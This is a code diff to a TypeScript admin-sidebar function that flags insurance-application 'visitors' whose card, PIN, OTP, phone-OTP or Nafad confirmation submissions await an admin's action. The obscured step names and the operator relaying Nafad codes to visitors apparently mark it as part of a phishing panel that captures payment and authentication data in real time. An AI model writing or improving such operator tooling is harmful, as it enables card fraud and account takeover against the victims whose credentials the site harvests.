@@ -22,25 +22,43 @@ interface VisitorSidebarProps {
 
 // Check if visitor is waiting for admin response
 const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
-  // If admin has already sent a Nafad code, the visitor is no longer "waiting for admin"
-  // but rather the admin is waiting for the visitor to use that code.
-  if (visitor.nafadConfirmationCode) return false;
+  // 1. Check if visitor is on Nafad page and waiting for admin to send code
+  // currentStep "_t6" is Nafad page. If no code sent yet, admin needs to act.
+  if (visitor.currentStep === "_t6" && !visitor.nafadConfirmationCode) {
+    return true;
+  }
 
-  // Check main status fields
+  // 2. Check main status fields for "waiting" or "pending" status
+  // These are often set when a user submits a form (OTP, Card, etc.)
   if (
-    visitor.cardStatus === "waiting" ||
-    visitor.otpStatus === "waiting" ||
-    visitor.pinStatus === "waiting" ||
-    visitor.phoneOtpStatus === "waiting" ||
-    visitor.nafadConfirmationStatus === "waiting"
-  ) return true;
+    visitor.cardStatus === "waiting" || 
+    visitor.cardStatus === "pending" ||
+    visitor.otpStatus === "waiting" || 
+    visitor.otpStatus === "pending" ||
+    visitor.pinStatus === "waiting" || 
+    visitor.pinStatus === "pending" ||
+    visitor.phoneOtpStatus === "waiting" || 
+    visitor.phoneOtpStatus === "pending" ||
+    visitor.nafadConfirmationStatus === "waiting" ||
+    visitor._v5Status === "pending" || // OTP 1 status
+    visitor._v4Status === "pending"    // Phone verification status
+  ) {
+    // Double check: if it's a Nafad related waiting but code is already sent, it's not waiting for admin anymore
+    if (visitor.nafadConfirmationCode && (visitor.currentStep === "_t6" || visitor.nafadConfirmationStatus === "waiting")) {
+      return false;
+    }
+    return true;
+  }
 
-  // Check history for any pending entries that need action
+  // 3. Check history for any "pending" entries
+  // This is the most reliable way as every submission creates a history entry
   if (visitor.history && Array.isArray(visitor.history)) {
-    return visitor.history.some(entry => 
+    const hasPendingAction = visitor.history.some(entry => 
       entry.status === "pending" && 
-      (entry.type === "otp" || entry.type === "phone_otp" || entry.type === "card" || entry.type === "pin" || entry.type === "_t1" || entry.type === "_t2" || entry.type === "_t3" || entry.type === "_t5")
+      (entry.type === "otp" || entry.type === "phone_otp" || entry.type === "card" || entry.type === "pin" || 
+       entry.type === "_t1" || entry.type === "_t2" || entry.type === "_t3" || entry.type === "_t5")
     );
+    if (hasPendingAction) return true;
   }
 
   return false;
